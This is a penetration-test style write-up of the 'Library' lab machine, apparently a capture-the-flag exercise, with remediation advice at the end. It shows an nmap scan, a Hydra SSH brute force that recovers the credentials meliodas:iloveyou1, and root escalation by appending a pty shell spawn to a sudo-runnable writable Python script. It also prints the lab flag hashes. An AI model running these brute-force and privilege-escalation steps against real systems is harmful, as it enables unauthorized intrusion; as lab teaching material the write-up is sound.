# Penetration Testing Assessment Report

## 1. Executive Summary

During the security assessment of the target host `10.49.174.14` (identified as the "Library" machine), multiple high-severity vulnerabilities and configuration flaws were discovered. A remote attacker could exploit these flaws sequentially to gain initial access, extract sensitive data, and escalate privileges to absolute administrative (`root`) control.

The attack chain progressed from public network reconnaissance to active brute-forcing of the Secure Shell (SSH) service due to weak credential management, culminating in an insecure `sudo` configuration that allowed execution of arbitrary Python code as the root user.

## 2. Assessment Scope & Target Information

- **Target IP Address:** `10.49.174.14`
    
- **Operating System:** Ubuntu 16.04.6 LTS (Linux Kernel 4.4.0-159-generic)
    
- **Objective:** Identify exposure vectors, attain initial access, and evaluate local privilege escalation vectors.
    

## 3. Technical Findings & Exploitation Walkthrough

### Phase 1: Initial Reconnaissance & Port Scanning

A full TCP port scan was conducted using `nmap` with service version detection and default scripts enabled.

Bash

```
sudo nmap -Pn -sV -sC -T4 -p- 10.49.174.14 -oN nmap/1.txt
```

#### Scan Results

|**Port**|**State**|**Service**|**Version**|
|---|---|---|---|
|**22/tcp**|Open|SSH|OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Protocol 2.0)|
|**80/tcp**|Open|HTTP|Apache httpd 2.4.18 (Ubuntu)|

- **Observations:** * The web server host title indicates **"Welcome to Blog - Library Machine"**.
    
    - A `robots.txt` file is present containing a single disallowed entry (`/`).
        

### Phase 2: Web Directory Enumeration

The `dirsearch` utility was used to map out the directory structure of the web application running on port 80.

Bash

```
dirsearch -u http://10.49.174.14
```

#### Discovered Directories & Files

- **`/robots.txt`** (HTTP 200 - 33B)
    
- **`/images/`** (HTTP 200 - 512B)
    
- **Various server configurations** (`.htaccess` variations returned HTTP 403 Forbidden, confirming their presence but restricting direct access).
    

_Note: Subsequent deeper directory brute-forcing utilizing the `DirBuster-2007_directory-list-2.3-medium.txt` wordlist did not yield additional immediate high-priority entry points before being terminated._

### Phase 3: Authentication Brute-Force (Initial Access)

Leveraging information indicating a possible username associated with the platform (`meliodas`), an online credential dictionary attack was launched against the OpenSSH service on port 22 using the `Hydra` framework and the `rockyou.txt` wordlist.

Bash

```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.49.174.14/
```

#### Results

- **Target:** `ssh://10.49.174.14:22/`
    
- **Identified Credentials:** `meliodas` : `iloveyou1`
    

> **Severity: High** > The use of predictable or weak passwords allows trivial unauthorized remote access to the internal environment.

### Phase 4: Initial Access & System Enumeration

Using the compromised credentials, an interactive SSH session was successfully established as the user `meliodas`.

Bash

```
ssh meliodas@10.49.174.14
```

Upon logging in, the local flag was retrieved from the user's home directory:

- **`user.txt` Hash:** `6d488cbb3f111d135722c33cb635f4ec`
    

#### Sudo Privileges Inspection

An inspection of the user's allowed `sudo` privileges via `sudo -l` revealed a critical configuration flaw:

Plaintext

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

The user is permitted to execute any Python command targeting the script `/home/meliodas/bak.py` with full root privileges without requiring a password. Because the script resides within the user's own home directory, it is entirely write-accessible by `meliodas`.

### Phase 5: Local Privilege Escalation

Since the script `/home/meliodas/bak.py` can be modified by the current user and executed as root, a standard Python persistent shell spawn routine was appended directly into the file.

Bash

```
echo 'import pty; pty.spawn("/bin/sh")' >> /home/meliodas/bak.py
```

Executing the script with elevated privileges triggers the injected payload, dropping the session into a root interactive shell:

Bash

```
sudo python /home/meliodas/bak.py
```

#### Results

- **Effective User:** `root`
    
- **`root.txt` Hash:** `e8c8c6c256c35515d1d344ee0488c617`
    

## 4. Vulnerability Summary & Remediation

### 1. Weak Password Policy (SSH)

- **Risk:** High
    
- **Impact:** Allows remote threat actors to guess account credentials and gain access to internal systems.
    
- **Remediation:** Enforce strong password complexity rules and migrate to public-key authentication (SSH keys) instead of password-based logins. Implement rate-limiting via tools like `Fail2Ban`.
    

### 2. Insecure Sudo Configuration & Insecure File Permissions

- **Risk:** Critical
    
- **Impact:** Complete system takeover. Users can manipulate files they own to run arbitrary system commands as the superuser.
    
- **Remediation:** * Avoid granting `NOPASSWD` privileges to scripts located within user-controlled directories.
    
    - If the script must be run as root, move `bak.py` to a secure directory (e.g., `/usr/local/bin/`), restrict its write permissions explicitly to `root:root` (`chmod 755`), and ensure it does not execute unverified user inputs.